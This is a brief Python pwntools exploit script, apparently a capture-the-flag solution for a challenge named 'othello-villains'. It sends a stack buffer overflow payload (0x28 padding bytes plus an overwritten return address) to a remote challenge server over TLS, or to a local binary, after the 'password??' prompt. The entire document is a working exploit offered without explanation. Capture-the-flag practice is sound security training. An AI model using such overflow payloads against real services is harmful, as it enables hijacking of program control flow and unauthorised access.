#!/usr/bin/python3
from pwn import *

payload = b'a'*0x28+b'\xae\x12\x40\x00\x00\x00'+b'\n'

USE_REMOTE = True
REMOTE_HOST = "othello-villains-e31ac9ab5752f81e.challs.brunnerne.xyz"
REMOTE_PORT = 443

if USE_REMOTE:
    p= remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
else:
    e = ELF("./othelloserver")
    p = e.process()


input()

print(p.readuntil("password??").decode())
p.write(payload)
print(p.readall())
